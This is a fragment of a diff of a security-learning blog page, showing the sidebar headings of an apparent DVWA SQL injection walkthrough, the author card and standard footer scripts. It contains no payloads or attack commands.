nav-level-3"><a class="nav-link" href="#注入判断-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">注入判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破数据库"><span class="nav-number">2.3.2.</span> <span class="nav-text">爆破数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破数据表"><span class="nav-number">2.3.3.</span> <span class="nav-text">爆破数据表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破字段"><span class="nav-number">2.3.4.</span> <span class="nav-text">爆破字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破字段内容"><span class="nav-number">2.3.5.</span> <span class="nav-text">爆破字段内容</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MEDIUM"><span class="nav-number">3.</span> <span class="nav-text">MEDIUM</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#源代码-1"><span class="nav-number">3.1.</span> <span class="nav-text">源代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#手动注入-1"><span class="nav-number">3.2.</span> <span class="nav-text">手动注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注入判断-2"><span class="nav-number">3.2.1.</span> <span class="nav-text">注入判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#猜解SQL查询语句中的字段数-1"><span class="nav-number">3.2.2.</span> <span class="nav-text">猜解SQL查询语句中的字段数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#确定显示字段顺序-1"><span class="nav-number">3.2.3.</span> <span class="nav-text">确定显示字段顺序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取当前数据库和用户名-1"><span class="nav-number">3.2.4.</span> <span class="nav-text">获取当前数据库和用户名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取数据库中的表-1"><span class="nav-number">3.2.5.</span> <span class="nav-text">获取数据库中的表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取表中的字段名-1"><span class="nav-number">3.2.6.</span> <span class="nav-text">获取表中的字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#下载数据-1"><span class="nav-number">3.2.7.</span> <span class="nav-text">下载数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLmap注入-1"><span class="nav-number">3.3.</span> <span class="nav-text">SQLmap注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#截获数据包"><span class="nav-number">3.3.1.</span> <span class="nav-text">截获数据包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入判断-3"><span class="nav-number">3.3.2.</span> <span class="nav-text">注入判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破数据库-1"><span class="nav-number">3.3.3.</span> <span class="nav-text">爆破数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破数据表-1"><span class="nav-number">3.3.4.</span> <span class="nav-text">爆破数据表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破字段-1"><span class="nav-number">3.3.5.</span> <span class="nav-text">爆破字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破字段内容-1"><span class="nav-number">3.3.6.</span> <span class="nav-text">爆破字段内容</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HIGH"><span class="nav-number">4.</span> <span class="nav-text">HIGH</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#源代码-2"><span class="nav-number">4.1.</span> <span class="nav-text">源代码</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#IMPOSSIBLE"><span class="nav-number">5.</span> <span class="nav-text">IMPOSSIBLE</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="李钰璕"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">李钰璕</p>
+  <div class="site-description" itemprop="description">从0开始学习网络安全</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">75</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">105</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Leeyuxun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Leeyuxun" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i></a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:leeyuxun@163.com" title="E-Mail → mailto:leeyuxun@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!---
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">李钰璕</span>
+</div>--->
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
     window.MathJax = {
       loader: {
           load: ['[tex]/mhchem'],
@@ -64,4 +728,12 @@
     MathJax.startup.document.state(0);
     MathJax.texReset();
     MathJax.typeset();
-  }</script></body></html>
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
